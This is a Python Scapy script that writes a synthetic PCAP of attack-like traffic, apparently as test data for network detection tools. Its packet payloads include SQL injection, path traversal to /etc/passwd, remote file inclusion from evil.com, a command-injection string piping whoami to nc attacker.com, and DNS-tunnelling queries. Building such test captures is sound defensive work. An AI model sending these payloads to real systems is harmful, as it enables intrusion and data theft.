#!/usr/bin/env python3
from scapy.all import (
    Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandString, wrpcap
)
import random
import os

def create_suspicious_traffic():
    """Generate a PCAP file with suspicious traffic from birdy.lan"""
    packets = []

    # Malicious actor details
    attacker_ip = "192.168.86.42"  # birdy.lan
    attacker_mac = "b8:27:eb:13:19:3b"

    # Target IPs (other devices in network)
    target_ips = [
        "192.168.1.100",  # My Laptop
        "192.168.1.101",  # Smartphone
        "192.168.1.102",  # Smart TV
        "192.168.1.10",   # Domain Controller
        "192.168.1.20"    # File Server
    ]

    # 1. Advanced Port Scanning
    print("Generating advanced port scan traffic...")
    for target in target_ips:
        # TCP SYN scan with common ports
        common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 3306, 3389, 5432, 8080]
        for port in common_ports:
            # SYN scan
            pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")/\
                  IP(src=attacker_ip, dst=target)/\
                  TCP(sport=random.randint(49152, 65535), dport=port, flags="S")
            packets.append(pkt)

            # ACK scan (firewall enumeration)
            pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")/\
                  IP(src=attacker_ip, dst=target)/\
                  TCP(sport=random.randint(49152, 65535), dport=port, flags="A")
            packets.append(pkt)

    # 2. Enhanced Brute Force Attacks
    print("Generating brute force attempts...")
    for target in target_ips:
        # SSH Brute Force
        for _ in range(30):
            pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")/\
                  IP(src=attacker_ip, dst=target)/\
                  TCP(sport=random.randint(49152, 65535), dport=22)/\
                  Raw(load=b"SSH-2.0-OpenSSH_8.2p1")
            packets.append(pkt)
    
        # RDP Brute Force
        for _ in range(30):
            pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")/\
                  IP(src=attacker_ip, dst=target)/\
                  TCP(sport=random.randint(49152, 65535), dport=3389)/\
                  Raw(load=RandString(size=100))  # Simulated RDP connection attempt
            packets.append(pkt)
    
        # SMB Authentication Attempts
        for _ in range(30):
            pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")/\
                  IP(src=attacker_ip, dst=target)/\
                  TCP(sport=random.randint(49152, 65535), dport=445)/\
                  Raw(load=b"\x00\x00\x00\x85\xffSMBr")  # SMB session setup request
            packets.append(pkt)

    # 3. Advanced Data Exfiltration
    print("Generating sophisticated data exfiltration...")
    exfil_patterns = [
        # Command & Control servers
        {"ip": "45.77.65.211", "port": 443, "size": 1400},  # HTTPS
        {"ip": "198.51.100.123", "port": 53, "size": 500},   # DNS tunnel
        {"ip": "203.0.113.42", "port": 6667, "size": 800},   # IRC
        {"ip": "91.234.56.78", "port": 8080, "size": 1200},  # HTTP proxy
        {"ip": "185.12.45.89", "port": 465, "size": 900}    # SMTPS
    ]

    for pattern in exfil_patterns:
        for _ in range(15):
            pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")/\
                  IP(src=attacker_ip, dst=pattern["ip"])/\
                  TCP(sport=random.randint(49152, 65535), dport=pattern["port"])/\
                  Raw(load=RandString(size=pattern["size"]))
            packets.append(pkt)

    # 4. Enhanced DNS Attacks
    print("Generating DNS attacks...")
    malicious_domains = [
        "exfil.evil.com",
        "c2.malware.net",
        "data.badactor.org",
        "botnet.command.cc",
        "ransomware.payment.io"
    ]

    for domain in malicious_domains:
        # DNS tunneling
        for _ in range(10):
            encoded_data = RandString(size=30)
            query = f"{encoded_data}.{domain}"
            pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")/\
                  IP(src=attacker_ip, dst="8.8.8.8")/\
                  UDP(sport=53, dport=53)/\
                  DNS(rd=1, qd=DNSQR(qname=query))
            packets.append(pkt)
    
        # DNS zone transfer attempts
        pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")/\
              IP(src=attacker_ip, dst="192.168.1.10")/\
              UDP(sport=53, dport=53)/\
              DNS(rd=1, qr=0, opcode="QUERY", qd=DNSQR(qname=domain, qtype="AXFR"))
        packets.append(pkt)

    # 5. Advanced Web Attacks
    print("Generating sophisticated web attacks...")
    web_attacks = [
        # SQL Injection
        "/login.php?username=admin'--&password=anything",
        "/search?q=1 UNION SELECT username,password FROM users--",
        "/product?id=1 OR 1=1",

        # Directory Traversal
        "/?page=../../../../etc/passwd",
        "/?file=../../../windows/win.ini",

        # Remote File Inclusion
        "/include.php?file=http://evil.com/shell.php",
        "/load.php?module=http://attacker.com/malware.php",

        # Command Injection
        "/ping.php?host=127.0.0.1;cat /etc/passwd",
        "/exec?cmd=whoami|nc attacker.com 4444",

        # Admin Panel Attacks
        "/wp-admin/",
        "/administrator/",
        "/phpmyadmin/",
        "/manager/html"
    ]

    for target in target_ips:
        for path in web_attacks:
            pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")/\
                  IP(src=attacker_ip, dst=target)/\
                  TCP(sport=random.randint(49152, 65535), dport=80)/\
                  Raw(load=f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
            packets.append(pkt)

    # 6. Network Enumeration
    print("Generating network enumeration traffic...")
    for target in target_ips:
        # SMB Enumeration
        smb_paths = [
            "\\\\ADMIN$",
            "\\\\C$",
            "\\\\IPC$",
            "\\\\print$",
            "\\\\SYSVOL"
        ]
        for path in smb_paths:
            pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")/\
                  IP(src=attacker_ip, dst=target)/\
                  TCP(sport=random.randint(49152, 65535), dport=445)/\
                  Raw(load=f"SMB TREE CONNECT {path}")
            packets.append(pkt)
    
        # LDAP Queries
        ldap_queries = [
            "(&(objectClass=user)(memberOf=Domain Admins))",
            "(&(objectClass=computer)(operatingSystem=*server*))",
            "(servicePrincipalName=*)"
        ]
        for query in ldap_queries:
            pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")/\
                  IP(src=attacker_ip, dst=target)/\
                  TCP(sport=random.randint(49152, 65535), dport=389)/\
                  Raw(load=query.encode())
            packets.append(pkt)

    # Add some normal traffic to mix
    print("Adding normal traffic...")
    legitimate_domains = ["www.google.com", "www.microsoft.com", "www.amazon.com", "www.github.com"]
    for _ in range(30):
        src = random.choice(target_ips)
        domain = random.choice(legitimate_domains)
        pkt = Ether(src=random.choice(["00:11:22:33:44:55", "AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66"]))/\
              IP(src=src, dst="8.8.8.8")/\
              UDP(sport=random.randint(49152, 65535), dport=53)/\
              DNS(rd=1, qd=DNSQR(qname=domain))
        packets.append(pkt)

    # Create captures directory if it doesn't exist
    os.makedirs("captures", exist_ok=True)

    # Write packets to PCAP
    pcap_file = "captures/suspicious_traffic.pcap"
    wrpcap(pcap_file, packets)
    print(f"\nCreated PCAP file with {len(packets)} packets of suspicious traffic")
    print(f"PCAP file location: {os.path.abspath(pcap_file)}")
    return pcap_file

if __name__ == "__main__":
    create_suspicious_traffic()
